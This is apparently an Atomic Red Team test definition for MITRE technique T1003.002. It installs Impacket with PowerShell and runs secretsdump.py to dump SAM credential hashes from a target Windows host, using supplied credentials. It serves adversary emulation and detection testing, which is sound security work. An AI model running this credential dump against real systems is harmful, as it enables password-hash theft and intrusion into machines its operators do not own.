attack_technique: T1003.002
display_name: "OS Credential Dumping: Security Account Manager"
atomic_tests:
- name: Impacket Secretsdump
  auto_generated_guid: 250e8ba8-6d60-40c3-ba85-d9c2c3a34221
  description: |
    Launches Impacket secretsdump module.

    This test requires python to be installed
  supported_platforms:
  - windows
  input_arguments:
    path_to_impacket:
      description: Path to impacket installation (if None it will use impacket location after pip install)
      type: path
      default: None
    target_ip:
      description: IP of target machine
      type: string
      default: 192.168.100.100
    target_username:
      description: Username to use for authentication on target machine
      type: string
      default: test
    target_password:
      description: Password to use for authentication on target machine
      type: string
      default: test
  dependency_executor_name: powershell
  dependencies:
    - description: Test if script exists
      prereq_command: |
        if ("#{path_to_impacket}" -eq "None"){if(pip freeze | Select-String impacket) {exit 0} else {exit 1}} 
        else {if(dir "#{path_to_impacket}"|Select-String impacket) {exit 0} else {exit 1}}
      get_prereq_command: |
        if ("#{path_to_impacket}" -eq "None"){pip install impacket}
        else{Invoke-WebRequest "https://github.com/fortra/impacket/archive/refs/tags/impacket_0_11_0.zip" -OutFile "#{path_to_impacket}\impacket.zip";
        Expand-Archive -Path #{path_to_impacket}\impacket.zip -DestinationPath #{path_to_impacket}\impacket
        pip install -r #{path_to_impacket}\impacket\impacket-impacket_0_11_0\requirements.txt
        pip install setuptools}
  executor:
    command: |
      if ("#{path_to_impacket}" -eq "None"){$path = "C:\Users\$Env:Username\AppData\Local\Programs\Python\Python312\Lib\site-packages\impacket\examples"} else {$path = "#{path_to_impacket}\impacket\impacket-impacket_0_11_0\examples"};
      cd $path;
      python.exe secretsdump.py #{target_username}:#{target_password}@#{target_ip}
    name: powershell